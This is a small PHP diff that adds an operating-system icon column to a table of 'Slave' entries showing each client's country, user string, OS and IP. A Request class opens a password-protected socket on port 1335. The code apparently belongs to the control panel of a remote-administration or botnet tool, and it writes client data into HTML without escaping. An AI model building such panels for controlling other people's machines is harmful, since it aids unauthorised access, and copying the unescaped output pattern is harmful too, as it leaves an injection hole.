@@ -1,4 +1,5 @@
 <?php
+
 class Request {
 	
 	public function createSocket($address = "127.0.0.1", $port = "1335", $password = "PWD") {
@@ -51,11 +52,14 @@ class Slave {
 	}
 	
 	public function getTableFormatted() {
+		require_once "operatingsystem.php";
+		
 		$country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
 		$userstring = '<b>' . $this->array['userstring'] . '</b>';
 		$os = $this->array['os'];
+		$osIcon = '<img src="' . OperatingSystem::getIcon($os) . '"> ' . $os;
 		$ip = $this->array['ip'];
 		
-		return "<td class=%c>" . $country . "</td>\n<td class=%c>" . $userstring . "</td>\n<td class=%c>" . $os . "</td>\n<td class=%c>$ip</td>\n";
+		return "<td class=%c>" . $country . "</td>\n<td class=%c>" . $userstring . "</td>\n<td class=%c>" . $osIcon . "</td>\n<td class=%c>$ip</td>\n";
 	}
 }
